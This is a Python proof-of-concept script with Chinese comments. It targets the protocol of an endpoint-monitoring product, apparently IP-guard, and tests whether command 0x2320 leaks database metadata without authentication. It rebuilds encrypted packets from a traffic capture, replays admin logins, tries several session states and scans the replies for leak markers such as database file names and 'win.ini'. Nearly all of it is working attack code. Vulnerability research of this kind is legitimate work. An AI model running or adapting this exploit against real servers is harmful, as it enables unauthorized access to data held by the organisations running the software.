"""poc_2320_preauth_dbleak.py — 测 cmd=0x2320/sub=5 在不同认证状态下能否泄露 DB 元数据

依据 ALL.pcapng 抓的真实 C2S:
  flags=0xc600, sess_state=(0,0), fp_lo=0x14, body=zlib(550B XML)→AES→208B
  body XML 模板见下方

测试矩阵:
  raw    - 仅 socket connect, 直接发 (sess_state=0)
  hello  - 0x1001 hello 后发 (sess_state=0)
  auth0  - admin 登录后, 强制 sess_state=0
  authS  - admin 登录后, 用真实 SU 的 lr/st

成功标志: S2C plain 含 'Ocular' / 'OCULAR3' / 'MDF'
"""
import os, socket, struct, sys, zlib, re

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.packet import build_packet_with_state, recv_full_packet, parse_packet
from ipguard_login.crypto import HDR_MAGIC, deobf_header, decrypt_payload


XML_BODY = (
    "<DATA>\r\n"
    "<SUBLOGTYPEMASK>0</SUBLOGTYPEMASK>\r\n"
    "<DRIVETYPEMASK>0</DRIVETYPEMASK>\r\n"
    "<DESTDRIVETYPE>0</DESTDRIVETYPE>\r\n"
    "<ENCRYPTMASK>0</ENCRYPTMASK>\r\n"
    "<MINSIZE>0</MINSIZE>\r\n"
    "<MAXSIZE>0</MAXSIZE>\r\n"
    "<BACKUP>0</BACKUP>\r\n"
    "<APPPARAM/>\r\n"
    "</DATA>"
)


def build_body():
    """完整 body 对照 pcap (550B 解压前):
       0x00-0x2F  48B 0xFF padding/canary
       0x30-0x3F  2x QWORD 堆指针 (抓包进程地址, 全填 0)
       0x40-0x4B  12B 零
       0x4C-0x4F  DWORD type = 2
       0x50-0x53  DWORD count = 1
       0x54-0x57  DWORD wcs_chars = WCHAR 字符数 (不含 NUL)
       0x58-0x5B  WORD 1, WORD 1
       0x5C+      wcs (utf-16-le) + NUL
    然后 zlib 压缩。"""
    pad48 = b"\xff" * 48
    ptr2  = b"\x00" * 16              # 2x QWORD 堆指针位置
    zero16 = b"\x00" * 12             # 12B 零
    type4 = struct.pack("<I", 2)      # type = 2
    wcs_raw = XML_BODY.encode("utf-16-le")    # 不含 NUL 的字符数
    wcs_chars = len(wcs_raw) // 2
    header12 = struct.pack("<IIHH", 1, wcs_chars, 1, 1)
    wcs = wcs_raw + b"\x00\x00"
    raw = pad48 + ptr2 + zero16 + type4 + header12 + wcs
    # 检查 wcs 起点应该 = 0x5C = 92
    assert len(pad48 + ptr2 + zero16 + type4 + header12) == 0x5C, \
        f"prefix len wrong: {len(pad48 + ptr2 + zero16 + type4 + header12):#x}"
    return zlib.compress(raw, 1)


def send_2320_5(host, port, sess_lr, sess_st, body, fp8, nonce=None,
                pre_hello=False, pre_auth_user=None, pre_auth_pwd=None,
                timeout=10):
    """统一封装: 建 socket, 可选预登录/hello, 然后发 cmd=0x2320/5"""
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    try:
        if pre_auth_user:
            base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
            idx, real_lr, real_st, _ = replay_login(s, pre_auth_user, pre_auth_pwd,
                                                     base_nonce, show_crypto=False,
                                                     verbose=False)
            if nonce is None:
                nonce = (base_nonce + idx) & 0xFFFFFFFF
        elif pre_hello:
            # 0x1001 hello
            hello = build_packet_with_state(
                flags=0x4500, a2=0x1001, a3=0,
                nonce=0x00100001,
                sess_state_16_24=b"\x00" * 8,
                fp_lo=b"\x00" * 8, fp_hi=b"\x00" * 8,
                plain=b"",
            )
            s.sendall(hello)
            _ = recv_full_packet(s)

        if nonce is None:
            nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000

        pkt = build_packet_with_state(
            flags=0xc600, a2=0x2320, a3=5, nonce=nonce,
            sess_state_16_24=struct.pack("<II", sess_lr, sess_st),
            fp_lo=fp8, fp_hi=b"\x00" * 8,
            plain=body,
        )
        s.sendall(pkt)
        return parse_packet(recv_full_packet(s))
    finally:
        try: s.close()
        except: pass


HOT_WORDS = ("Ocular", "OCULAR3", ".MDF", "ProgramData", "0E7A5A6E","win.ini","hosts","1.exe")


def check_leak(plain):
    if not isinstance(plain, bytes) or len(plain) < 16:
        return None
    # try utf-16-le
    try:
        text = plain.decode("utf-16-le", errors="ignore")
    except:
        return None
    found = [w for w in HOT_WORDS if w in text]
    runs = re.findall(r'[\x20-\x7e]{4,}', text)
    return {"found": found, "wcs_runs": runs[:12]}


def fmt(r):
    if not isinstance(r, dict): return "<?>"
    if "_err" in r: return f"⏱ EXC: {r['_err']}"
    fl = r.get("flags", 0); plen = r.get("payload_len", 0)
    plain = r.get("plain", b"")
    err = "ERR" if (fl & 0x0002) else "OK"
    pl = len(plain) if isinstance(plain, bytes) else 0
    return f"flags=0x{fl:04x}[{err}] plen={plen} plain={pl}B"


def run_one(label, fn):
    print(f"\n=== {label} ===")
    try:
        r = fn()
    except Exception as e:
        print(f"  ⏱ EXC: {e}")
        return
    print(f"  {fmt(r)}")
    plain = r.get("plain", b"") if isinstance(r, dict) else b""
    leak = check_leak(plain) if isinstance(plain, bytes) else None
    if leak:
        if leak["found"]:
            print(f"  ✅ LEAK matched: {leak['found']}")
        if leak["wcs_runs"]:
            print(f"  wcs runs: {leak['wcs_runs']}")
    if isinstance(plain, bytes) and 0 < len(plain) <= 256:
        print(f"  plain hex: {plain.hex()}")


def main():
    if len(sys.argv) < 3:
        print(__doc__); sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])
    user = sys.argv[3] if len(sys.argv) >= 5 else None
    pwd  = sys.argv[4] if len(sys.argv) >= 5 else None

    body = build_body()
    print(f"[*] body (after zlib) = {len(body)}B")

    fp8_zero = b"\x00" * 8
    fp8_14   = struct.pack("<II", 0x14, 0)   # pcap 用的 fp_lo=0x14
    fp8_def  = SESSION_FP_DEFAULT

    run_one("raw, sess=(0,0), fp=0",
            lambda: send_2320_5(host, port, 0, 0, body, fp8_zero))
    run_one("raw, sess=(0,0), fp=0x14",
            lambda: send_2320_5(host, port, 0, 0, body, fp8_14))
    run_one("hello, sess=(0,0), fp=0x14",
            lambda: send_2320_5(host, port, 0, 0, body, fp8_14, pre_hello=True))

    if user:
        run_one("auth0 (admin login, sess=0,0)",
                lambda: send_2320_5(host, port, 0, 0, body, fp8_def,
                                     pre_auth_user=user, pre_auth_pwd=pwd))
        run_one("auth0 (admin login, sess=0,0, fp=0x14)",
                lambda: send_2320_5(host, port, 0, 0, body, fp8_14,
                                     pre_auth_user=user, pre_auth_pwd=pwd))

        # 也试用真 SU 的 lr/st (need to get them — replay_login returns)
        def with_real_sess():
            base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
            s = socket.create_connection((host, port), timeout=15)
            s.settimeout(15)
            try:
                idx, lr, st, _ = replay_login(s, user, pwd, base_nonce, show_crypto=False, verbose=False)
                nonce = (base_nonce + idx) & 0xFFFFFFFF
                pkt = build_packet_with_state(
                    flags=0xc600, a2=0x2320, a3=5, nonce=nonce,
                    sess_state_16_24=struct.pack("<II", lr, st),
                    fp_lo=SESSION_FP_DEFAULT, fp_hi=SESSION_FP_DEFAULT,
                    plain=body,
                )
                s.sendall(pkt)
                return parse_packet(recv_full_packet(s))
            finally:
                try: s.close()
                except: pass

        run_one("authS (admin login, real lr/st)", with_real_sess)


if __name__ == "__main__":
    main()
